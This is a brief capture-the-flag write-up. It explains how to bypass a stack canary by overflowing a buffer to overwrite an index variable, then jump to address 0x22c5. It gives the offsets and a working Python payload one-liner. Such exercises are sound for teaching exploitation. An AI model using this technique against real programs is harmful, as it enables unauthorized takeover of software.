In this challenge the canary is enabled which means we cannot simply overflow the input buffer to overwrite the return address
Luckily there is a vulnerability in the program

The program reads from stdin one character at a time and then puts it on the stack at address *input_buffer + n where n is the number of characters that has been entered. 
So if we overflow the buffer and change the value of n to some address beyond the canary we can easily take control of the entire stack


The variable is at offset 80 0x50

The return address is at offset 104

We have to jummp to 0x22c5

    python -c 'import sys, time; sys.stdout.buffer.write(b"106"); time.sleep(1); sys.stdout.buffer.write(b"A"*81 + b"\x67" + b"\xc5\x22")'
